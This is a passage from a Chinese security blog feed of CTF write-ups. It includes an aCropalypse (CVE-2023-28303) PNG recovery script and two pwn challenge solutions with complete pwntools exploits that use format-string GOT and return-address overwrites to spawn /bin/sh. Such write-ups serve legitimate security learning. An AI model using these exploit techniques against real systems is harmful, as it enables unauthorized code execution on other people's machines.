class="number">2</span>, <span class="string">&quot;little&quot;</span>) + <span class="string">b&quot;X&quot;</span> * <span class="number">0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(idat)):</span><br><span class="line">truncated = byte_offsets[i%<span class="number">8</span>][i//<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># only bother looking if it&#x27;s (maybe) the start of a non-final adaptive huffman coded block</span></span><br><span class="line"><span class="keyword">if</span> truncated[<span class="number">0</span>]&amp;<span class="number">7</span> != <span class="number">0b100</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">d = zlib.decompressobj(wbits=-<span class="number">15</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">decompressed = d.decompress(prefix+truncated) + d.flush(zlib.Z_FINISH)</span><br><span class="line">decompressed = decompressed[<span class="number">0x8000</span>:] <span class="comment"># remove leading padding</span></span><br><span class="line"><span class="keyword">if</span> d.eof <span class="keyword">and</span> d.unused_data <span class="keyword">in</span> [<span class="string">b&quot;&quot;</span>, <span class="string">b&quot;\x00&quot;</span>]: <span class="comment"># there might be a null byte if we added too many padding bits</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found viable parse at bit offset <span class="subst">&#123;i&#125;</span>!&quot;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">XXX:</span> maybe there could be false positives and we should keep looking?</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Parsed until the end of a zlib stream, but there was still <span class="subst">&#123;<span class="built_in">len</span>(d.unused_data)&#125;</span> byte of remaining data. Skipping.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> zlib.error <span class="keyword">as</span> e: <span class="comment"># this will happen almost every time</span></span><br><span class="line"><span class="comment">#print(e)</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Failed to find viable parse :(&quot;</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generating output PNG...&quot;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="built_in">open</span>(sys.argv[<span class="number">4</span>], <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">out.write(PNG_MAGIC)</span><br><span class="line"></span><br><span class="line">ihdr = <span class="string">b&quot;&quot;</span></span><br><span class="line">ihdr += orig_width.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">ihdr += orig_height.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">ihdr += (<span class="number">8</span>).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>) <span class="comment"># bitdepth</span></span><br><span class="line">ihdr += (<span class="number">2</span>).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>) <span class="comment"># true colour</span></span><br><span class="line">ihdr += (<span class="number">0</span>).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>) <span class="comment"># compression method</span></span><br><span class="line">ihdr += (<span class="number">0</span>).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>) <span class="comment"># filter method</span></span><br><span class="line">ihdr += (<span class="number">0</span>).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>) <span class="comment"># interlace method</span></span><br><span class="line"></span><br><span class="line">pack_png_chunk(out, <span class="string">b&quot;IHDR&quot;</span>, ihdr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill missing data with solid magenta</span></span><br><span class="line">reconstructed_idat = <span class="built_in">bytearray</span>((<span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff\x00\xff&quot;</span> * orig_width) * orig_height)</span><br><span class="line"></span><br><span class="line"><span class="comment"># paste in the data we decompressed</span></span><br><span class="line">reconstructed_idat[-<span class="built_in">len</span>(decompressed):] = decompressed</span><br><span class="line"></span><br><span class="line"><span class="comment"># one last thing: any bytes defining filter mode may</span></span><br><span class="line"><span class="comment"># have been replaced with a backref to our &quot;X&quot; padding</span></span><br><span class="line"><span class="comment"># we should fine those and replace them with a valid filter mode (0)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Fixing filters...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reconstructed_idat), orig_width*<span class="number">3</span>+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> reconstructed_idat[i] == <span class="built_in">ord</span>(<span class="string">&quot;X&quot;</span>):</span><br><span class="line"><span class="comment">#print(f&quot;Fixup&#x27;d filter byte at idat byte offset &#123;i&#125;&quot;)</span></span><br><span class="line">reconstructed_idat[i] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pack_png_chunk(out, <span class="string">b&quot;IDAT&quot;</span>, zlib.compress(reconstructed_idat))</span><br><span class="line">pack_png_chunk(out, <span class="string">b&quot;IEND&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br></pre></td></tr></table></figure><p>但需要原图大小，因为是截图整个屏幕，搜了一下常用屏幕分辨率，最后试到一个“ 2560 * 1440”能大致还原：</p><p><img src="/img/%E6%98%9Fctf_wp/10.png" alt="out6"></p><p>放大肉眼查看得到flag如下：</p><p>*CTF{cve-2023-28303-windows-snipping-tool-is-not-secure-4E9019139D9A}</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023.7.28学习笔记</title>
      <link href="/2023/07/28/2023-7-28/"/>
      <url>/2023/07/28/2023-7-28/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4f1f6540dea12ea49cc9a6dbb12db1790e1282058aa0ec1e5aa9ddc7e55253e0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023.7.18学习笔记</title>
      <link href="/2023/07/18/2023-7-18/"/>
      <url>/2023/07/18/2023-7-18/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9c40e5ba62e04909b13d60a8094fdafbd2b6641e1f0ed41cc4b01f00f28b53d4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2023 week2 pwn YukkuriSay题解</title>
      <link href="/2023/07/17/HGAME2023/"/>
      <url>/2023/07/17/HGAME2023/</url>
      
        <content type="html"><![CDATA[<p><strong>迁移过来的水文</strong></p><h2 id="检查保护："><a href="#检查保护：" class="headerlink" title="检查保护："></a>检查保护：</h2><p>拿到文件先checksec一下：</p><p><img src="/img/hgameweek2/1.png"></p><p>64位程序，开启canary和nx保护，没有开启PIE（可以使用绝对地址了）</p><p>继续往下看，先不着急打开ida，我们先运行一下看看程序大概：输入字符串“aaaa-%p”让Yukkri输出，得到原字符串，此处没有格式化字符串，接下来问要不要继续，要则继续循环，不要则有“gift”，输入得知此处就有格式化字符串，也可以得到偏移是8，但程序也随着结束，大概清楚流程后就可以打开ida了</p><h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><h3 id="vuln-函数："><a href="#vuln-函数：" class="headerlink" title="vuln()函数："></a>vuln()函数：</h3><p><img src="/img/hgameweek2/2.png"></p><p>跟刚才运行看到的差不多，循环里输出的只是照样输出，输入不为‘N’或‘n’退出循环格式化字符串</p><p>看看<strong>buf</strong>能不能溢出：</p><p><img src="/img/hgameweek2/3.png"></p><p>长度不够我们溢出</p><p>看看<strong>str</strong>：</p><p><img src="/img/hgameweek2/4.png"></p><p>在bss段，可以确定是<strong>非栈上格式化字符串</strong>了</p><h3 id="print-str-函数："><a href="#print-str-函数：" class="headerlink" title="print_str()函数："></a>print_str()函数：</h3><p><img src="/img/hgameweek2/5.png"></p><p>现在最开始我们运行一下的优势就体现出来了，当然还是得看一下，万一我们有什么没看到的漏洞。</p><p>整体看下来之后其实就是打印Yukkri和我们输入的内容（此处是在栈上的）</p><h2 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h2><p>1、由于循环中我们输入的内容是在栈上的，而且栈内容没有清空，我们可以考虑输入足够长的字符串进行地址<strong>泄露得到libc基地址以</strong>及stack地址**</p><p>2、得到想要的地址后输入<strong>printf的got地址</strong>，利用格式化字符串修改为system，这样当输入**’&#x2F;bin&#x2F;sh’<strong>看似运行print(‘&#x2F;bin&#x2F;sh’)时，实际是运行</strong>system(‘&#x2F;bin&#x2F;sh’)**</p><p>3、同时也要输入stack的返回地址，因为我们格式化字符串是在<strong>call printf</strong>之后再进行的，简单理解就是运行printf之后才会将printf修改为system，所以我们需要</p><p>返回到<strong>“gift”</strong>这里来输入’&#x2F;bin&#x2F;sh’触发<strong>system(‘&#x2F;bin&#x2F;sh’)</strong></p><p><strong>注意：</strong>我们知道%n是修改4个字节，%hn是修改2个字节，%hhn是修改1个字节，我们手动格式化字符串无法一次性修改太多，因此这里要利用%hn，%hhn多次修改</p><h2 id="gdb调试分析："><a href="#gdb调试分析：" class="headerlink" title="gdb调试分析："></a>gdb调试分析：</h2><h3 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h3><p>我们查看一下循环里输入的栈内容：</p><p><img src="/img/hgameweek2/6.png"></p><p>可以看到在0x7fffffffdd50处是我们输入的地址，0x7fffffffde38处则可以泄露libc地址，0x7fffffffde50可以泄露栈地址，但我们知道输入的内容不会复原，所以要顺序泄露地址，先输入（0xf8-0x10）&#x3D;0xe8个字符泄露libc地址，再输入（0x110-0x10）&#x3D;0x100个字符泄露栈地址。将得到的地址减去偏移就能得到libc基地址和stack地址</p><h3 id="布栈："><a href="#布栈：" class="headerlink" title="布栈："></a>布栈：</h3><p>我们格式化字符串用%hhn替换需要从小到大排序（因为在后面的会包含前面的数量），所以可以考虑将printf分为两次修改，一次修改一个字节，一次修改两个字节，而修改返回地址也需要修改两个字节（0x40170e -&gt; 0x401671），因此prinft的got地址肯定是放在最前面的，而通过一开始的泄露我们可以知道修改printf的两个字节要放在修改返回地址的后面（0x8082&gt;0x1671）：</p><p><img src="/img/hgameweek2/7.png"></p><p>当然这是随机的，不是说system就一定是这个地址，不过一般来讲大于0x1671的概率还是很大的</p><p>所以我们在泄露地址后可以将栈依次设置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf_got + stack_addr(ret) + printf_got+1                                                                 </span><br></pre></td></tr></table></figure><p><img src="/img/hgameweek2/8.png"></p><h3 id="修改各个地址："><a href="#修改各个地址：" class="headerlink" title="修改各个地址："></a>修改各个地址：</h3><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys1=system&amp;<span class="number">0xff</span>  <span class="comment"># system的低字节</span></span><br><span class="line">sys2=(system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>  <span class="comment"># system的低二三字节</span></span><br><span class="line">gift_addr=gift&amp;<span class="number">0xffff</span>  <span class="comment"># gift的低二字节</span></span><br><span class="line">payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys1)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(gift_addr-sys1)+<span class="string">&#x27;c%9$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys2-gift_addr)+<span class="string">&#x27;c%10$hn&#x27;</span>      </span><br></pre></td></tr></table></figure><p>上面是获取各个地址数据和修改地址的代码</p><p>然后为什么要相减是因为后面地址替换的数量有包含前面已经替换的数量（既然包含了那就减去它）</p><p>而为什么要右移8是因为两位十六进制数就是八位二进制数（可以打开电脑自带计算器看看更直观）</p><p>printf修改前：</p><p><img src="/img/hgameweek2/9.png"></p><p>printf修改后：</p><p><img src="/img/hgameweek2/10.png"></p><h3 id="拿shell："><a href="#拿shell：" class="headerlink" title="拿shell："></a>拿shell：</h3><p>既然已经将printf修改为system了，而且返回地址也修改了，我们又有一次输入字符串的机会，输入’&#x2F;bin&#x2F;sh’即可触发printf(‘&#x2F;bin&#x2F;sh’)即system(‘&#x2F;bin&#x2F;sh’)了：</p><p><img src="/img/hgameweek2/11.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./yuku&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31924</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;yuku&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取libc地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;What would you like to let Yukkri say?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;setbuffer&#x27;</span>]-<span class="number">204</span>  <span class="comment"># 远程libc基地址</span></span><br><span class="line"><span class="comment">#libc_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-543852  # 本地</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取栈地址</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;else?(Y/n)&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布栈</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;else?(Y/n)&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">pri=libc_base+libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;printf:&#x27;</span>+<span class="built_in">hex</span>(pri))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">pri_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload=p64(pri_got)+p64(stack_addr+<span class="number">280</span>)+p64(pri_got+<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将printf的got表修改为system</span></span><br><span class="line">gift=<span class="number">0x401671</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;else?(Y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">sys1=system&amp;<span class="number">0xff</span></span><br><span class="line">sys2=(system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">gift_addr=gift&amp;<span class="number">0xffff</span></span><br><span class="line">payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys1)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((gift_addr)-(sys1))+<span class="string">&#x27;c%9$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys2-gift_addr)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;gift for you: \n&#x27;</span>,payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>此题属于简单的非栈上格式化字符串，因为我们可以直接将想要修改的地址放进栈里，只需要考虑写入的数据谁大谁小，地址谁前谁后的关系就好了，但再难一点的则需要通过格式化字符串放进栈里，这对于如何布置栈就需要更多的思考，后面有遇到再写吧（手动狗头）</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023hws夏令营选拔赛部分wp</title>
      <link href="/2023/07/17/hws%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/07/17/hws%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><strong>写在前头：只做出两道签到题，大佬们太多了，<del>这次进不了夏令营了</del>，？？？什么鬼，做出来题就能去，但跟其他事情冲突了，应该还是去不了了呜呜呜，总结起来就是知识面还是不够广，ezhttp死活做不出，还得继续努力学习，写做出来的两道简单题水一下(bushi)，记录一下。</strong></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn:"></a>pwn:</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt:"></a>fmt:</h3><p>栈上格式化字符串，保护全开（最开始忘了，跑去修改got表，浪费一堆时间）</p><p>第一次格式化字符串泄露地址，第二次修改返回地址为main以便后面进行布栈和修改</p><p>gdb手动调试可以发现结束时满足其中一个one_gadget的条件，got表不可修改，那么可以修改返回地址：</p><p><img src="/img/hws%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9Bwp/2.png" alt="2"></p><p>可以发现如果修改main+33得修改6个字节，而如果我们修改__ libc_start_main+243只需要修改<strong>3个字节</strong>，所以选择后者，后面就是在栈上布置 __ libc__start_main+243的地址，但需要注意的是我们无法一次修改太多字节，所以要修改的三个字节得分别写入，脚本如下（当时写得有点乱）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;60.204.140.184&#x27;,30160)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;%10$p-%19$p-%14$p&#x27;</span>  <span class="comment"># 泄露地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;I need a str: &#x27;</span>,payload1)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">2020800</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">main=main_addr-<span class="number">28</span>+<span class="number">5</span></span><br><span class="line">elf_base=main-<span class="number">0x13c6</span></span><br><span class="line">success(<span class="string">&#x27;main:&#x27;</span>+<span class="built_in">hex</span>(main))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">stack=stack_addr+<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">one1=libc_base+<span class="number">0xe3afe</span></span><br><span class="line">one2=libc_base+<span class="number">0xe3b01</span>  <span class="comment"># 符合条件的one_gadget</span></span><br><span class="line">one3=libc_base+<span class="number">0xe3b04</span></span><br><span class="line">success(<span class="string">&#x27;one1:&#x27;</span>+<span class="built_in">hex</span>(one1))</span><br><span class="line">success(<span class="string">&#x27;one2:&#x27;</span>+<span class="built_in">hex</span>(one2))</span><br><span class="line">success(<span class="string">&#x27;one3:&#x27;</span>+<span class="built_in">hex</span>(one3))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改返回地址以便再次格式化字符串</span></span><br><span class="line">main1=main%<span class="number">0x100</span></span><br><span class="line">success(<span class="string">&#x27;main1:&#x27;</span>+<span class="built_in">hex</span>(main1))</span><br><span class="line">payload2=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(main1).encode()+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;I need other str: &#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从小到大的三个字节（有时o2会比o3大）</span></span><br><span class="line">o1=one2%<span class="number">0x100</span></span><br><span class="line">o2=(one2&gt;&gt;<span class="number">16</span>)%<span class="number">0x100</span></span><br><span class="line">o3=(one2&gt;&gt;<span class="number">8</span>)%<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行布栈操作</span></span><br><span class="line">stack1=stack+<span class="number">2</span></span><br><span class="line">stack2=stack+<span class="number">1</span></span><br><span class="line"><span class="comment"># 格式化字符串修改__libc_start_main+243</span></span><br><span class="line">payload3=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(o1).encode()+<span class="string">b&#x27;c%11$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(o2-o1).encode()+<span class="string">b&#x27;c%12$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(o3-o2).encode()+<span class="string">b&#x27;c%13$hhn&#x27;</span></span><br><span class="line">payload3=payload3.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)+p64(stack1)+p64(stack2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;str: &#x27;</span>,payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/hws%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9Bwp/3.png" alt="3"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="usb"><a href="#usb" class="headerlink" title="usb:"></a>usb:</h3><p>8字节，可以得知是键盘流量，HID DATA格式，先提取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>然后网上找一个全一点的脚本跑一下数据是什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 